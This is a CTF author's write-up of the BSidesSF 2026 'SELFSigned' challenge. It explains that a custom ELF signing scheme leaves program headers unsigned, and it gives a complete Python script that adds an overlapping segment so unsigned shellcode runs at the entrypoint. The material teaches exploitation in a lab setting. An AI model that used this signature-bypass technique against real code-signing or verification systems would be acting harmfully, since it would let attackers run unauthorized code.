---
categories:
- Security
date: '2026-03-23T00:00:00Z'
tags:
- CTF
- BSidesSF
title: 'BSidesSF CTF 2026: SELFSigned (Author Writeup)'
---

It's been a minute since I've had a chance to write up a CTF challenge I wrote.
I actually thought my challenges might be a little bit challenge for the AI
agents, but looking at the time to first solve, I rather suspect that this
wasn't the case for this challenge.

> As a side note, we're definitely living in a weird time. Trying to build
> challenges that are interesting and approachable for humans but are not
> essentially trivial for AI agents is really weird (or even impossible for some
> disciplines).  I'm beginning to wonder if we're seeing the death of CTF, as
> well as any other structured game task that can be approached online.
> Jacob Krell believes we might already be there, based on a
> [whitepaper](https://infograph.venngage.com/pl/MifTplDvNc) published earlier
> this month.
>
> Maybe I'll try to play with AI in some CTFs and not just work contexts over
> the next year to see if I can get a better understanding of this space, but
> it's very challenging to figure out where we're going from here.
> It is very clear that "AI for CTF" and "AI for Cybersecurity in the workplace"
> are not at all the same.
> Maybe we continue to build for the humans that want to play, or maybe we
> design for AI vs AI competition, I don't really know.

***

Challenge description:

> Our service only accepts **signed** binaries. This ensures that only
> the code we provide can be sent back to be executed.

SELFSigned was a combination reversing/exploitation challenge, but not in a
traditional memory corruption kind of way. In fact, there should be no memory
corruption in the entire binary.

If you visit the site provided, you can download the signing tool as well as
a spec for the signing approach:

> # Secure ELF Singing Spec (SELF-Signed)
> 
> ## Key Format
> 
> Public and private keys are distributed in the following format:
> 
> key-type || ':' || key-role || ':' || base64-encoded key data
> 
> Currently, only ed25519 keys are supported.  `key-role` may be either 'public' or 'private'.
> 
> ## Binary Serialization
> 
> Serialization of structures for hashing, signing, or wire-format representations are done
> by CBOR (RFC 8949) with CDE rules for determinism.
> 
> ## ELF Signing
> 
> ### Hashing
> 
> All hashing is done with SHA-256 as the hash.
> 
> The hashable state of the binary is represented by the following:
> 
> - The ELF File Header
> - A dictionary of section name to the contents of the section header unless the section does not have the ALLOC flag.
> - A dictionary of section name to the hash of the contents of the section contents unless the section does not have
>   the ALLOC flag or the section type is SHT_NOBITS.
> 
> This is serialized to a byte stream which is hashed for the final file hash.
> 
> ### Signing Process
> 
> First, an unsigned ELF binary has a new (empty) section added called `.selfsigned`.  This section is large enough to
> hold the final signature.  This is added first so that all the section headers, section string table, and program header
> are unaffected by the signing operation itself.
> 
> Next, the hash is computed as described above. Ed25519 is used with the private key to sign this value. The public key,
> the file hash, and the signature are all serialized and inserted into the special .selfsigned section.
> 
> ## ELF Verification
> 
> Verification is straight forward. First, the signature is loaded from the `.selfsigned` section. Next, the file
> hash is computed as above, and compared to the value in the signature. The public key in the signature section is
> compared against the allowlist of public keys. Finally, the signature is verified via an Ed25519 operation. If all
> of these check out, then the file is allowed to run.

Looking at the binary, it's already signed and has the `.selfsigned` section
included. If we inspect it, we can see that it contains a valid signature over
the sections described. All section headers for allocated sections and all
section contents for sections with contents are included in the signature.
Additionally, the ELF header is hashed and signed, so we can't modify the
entrypoint or many of the other ELF attributes.

In theory, this should cover all of the code in the binary, but if you start
looking into how ELF binaries are loaded in Linux, you'll find that **sections**
aren't really what the loader and the kernel care about it -- instead, we need
to look at **segments**.  Of course, segments usually point to one or more
sections that are adjacent and will be loaded into the process memory space with
common permissions.

The program headers (the metadata about the segments that exist) are **not**
part of what is signed here. These define a few things:

- Type (`PT_LOAD` for data to be loaded from the file)
- Offset into the file
- Size to be loaded from file, and size of memory to be allocated
- Permissions of the resulting memory pages (read/write/execute)
- Virtual address at which to load

Interestingly, you can have segments overlap -- so you can even add a new
segment that loads data from a different part of the binary into the same range
of virtual addresses.  This allows you to overwrite existing addresses (such as
code) with your own contents.

Consequenly, adding a new segment with a virtual address range that overlaps the
program entrypoint allows us to control the code that is executed at program
entry. While I could replace it with a full binary, I'd need to make sure the
dynamic segment (`PT_DYNAMIC`) had all the needed libraries (probably just
libc), and that any position-dependent code is loaded at the right place.

Alternatively, we can just use position-independent code with no external
dependencies. If you've been in the security space for a while, you probably
recognize that this is how someone might describe shellcode, and that's exactly
what my approach does: load shellcode at the entry point.

Specifically, I create a new segment with some padding and then some shellcode,
set to load at the next lowest page boundary below the entrypoint. I place the
contents of this segment past the end of the existing file contents so it
doesn't overlap with any signed segments or headers that would cause the
signature to fail.  It is, in fact, not part of *any* segment, so the signature
verification code ignores this data entirely. This
shellcode will do whatever I need it to, so in this case, I use a simple
open/read/write to send the flag on stdout, which is captured by the web
interface.

My full automated solution script follows:

```python
from pwnlib import elf
import os
import sys
import math

def round_pg_down(n):
    return math.floor(n/4096) * 4096
def round_pg_up(n):
    return math.ceil(n/4096) * 4096

elfpath = sys.argv[1]
patchname = f'{elfpath}.patched'
shellcode = open(sys.argv[2], 'rb').read()

binary = elf.ELF(elfpath)
bindata = bytearray(binary.data)
entry = binary.entrypoint
phoff = binary['e_phoff']
phsize = binary['e_phentsize']
for i in range(binary.num_segments()):
    seg = binary.get_segment(i)
    if seg['p_vaddr'] <= entry and entry < (seg['p_vaddr'] + seg['p_filesz']):
        code_seg_n = i
        code_seg = seg
        break
else:
    print('No code segment found')
    sys.exit(1)

print(seg.header)
hdr_start = phoff + i * phsize
hdr_bytes = binary.structs.Elf_Phdr.build(seg.header)
if bindata[hdr_start:hdr_start+len(hdr_bytes)] != hdr_bytes:
    print('Header offset wrong?!')
    sys.exit(2)
#print(binary.structs.Elf_Phdr.build(seg.header))

# pad the file out to a page length
end_pad_len = 4096 - (len(bindata) % 4096)
end_pad = b'A' * end_pad_len
bindata += end_pad
orig_len_padded = len(bindata)

# now pad out until the entrypoint
start_pad_len = entry % 4096
start_pad = b'\x90' * start_pad_len
bindata += start_pad
sc_paddr = len(bindata)
bindata += shellcode

# finally round out to a whole number of pages
end_pad_len = 4096 - (len(bindata) % 4096)
end_pad = b'C' * end_pad_len
bindata += end_pad

# Path A: shift load virtual address and increase p_filesz to include tail
# only possible when filesz < round_pg_down(entrypoint)
if orig_len_padded <= round_pg_down(entry):
    # TODO
    pass

# Path B: shift physical addr and adjust p_filesz
else:
    new_header = seg.header.copy()
    new_header['p_offset'] = orig_len_padded
    new_header['p_filesz'] = len(bindata) - orig_len_padded
    new_header['p_memsz'] = new_header['p_filesz']
    new_header['p_vaddr'] = round_pg_down(entry)
    new_header['p_paddr'] = round_pg_down(entry)
    print(new_header)
    bindata[hdr_start:hdr_start+len(hdr_bytes)] = binary.structs.Elf_Phdr.build(new_header)

with open(patchname, 'wb') as fp:
    fp.write(bindata)
os.chmod(patchname, 0o755)
```

The shellcode was arbitrarily generated using pwntools in a standard fashion.
